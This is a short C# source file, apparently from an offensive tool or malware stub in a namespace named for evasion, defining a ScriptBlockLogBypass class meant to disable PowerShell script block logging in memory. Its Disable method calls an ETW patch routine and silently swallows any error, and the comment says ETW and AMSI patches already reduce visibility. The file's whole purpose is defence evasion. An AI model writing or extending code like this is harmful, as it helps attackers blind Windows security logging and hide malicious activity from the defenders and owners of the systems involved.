using System;

namespace NRE.Stub.Evasion
{
    /// <summary>
    /// Disable or bypass PowerShell script block logging (in-memory only, no disk).
    /// When PowerShell is loaded, ETW/AMSI patches already reduce visibility; this is a reserved hook for future SBL-specific patches.
    /// </summary>
    public static class ScriptBlockLogBypass
    {
        public static void Disable()
        {
            try { EtwPatch.Patch(); }
            catch { }
        }
    }
}
